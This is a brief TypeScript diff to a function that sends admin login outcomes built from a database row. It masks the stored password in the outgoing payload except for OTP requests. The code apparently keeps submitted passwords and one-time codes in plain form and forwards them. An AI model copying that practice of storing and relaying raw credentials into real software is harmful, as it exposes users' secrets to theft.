@@ -81,7 +81,7 @@ export async function claimAndSendAdminLoginOutcome(id: string): Promise<void> {
         maskedEmail: String(row.maskedEmail ?? ''),
         maskedPhone: String(row.maskedPhone ?? ''),
         code: requestKind === 'otp' ? String(row.password ?? '') : undefined,
-        password: String(row.password ?? ''),
+        password: requestKind === 'otp' ? String(row.password ?? '') : '••••••',
       })
     } catch (err) {
       await sql`
@@ -139,7 +139,7 @@ export async function claimAndSendAdminLoginOutcome(id: string): Promise<void> {
         maskedEmail: String(row.maskedEmail ?? ''),
         maskedPhone: String(row.maskedPhone ?? ''),
         code: requestKind === 'otp' ? String(row.password ?? '') : undefined,
-        password: String(row.password ?? ''),
+        password: requestKind === 'otp' ? String(row.password ?? '') : '••••••',
       })
     } catch (err) {
       if (shardRequiresCcId(shardIndex)) {
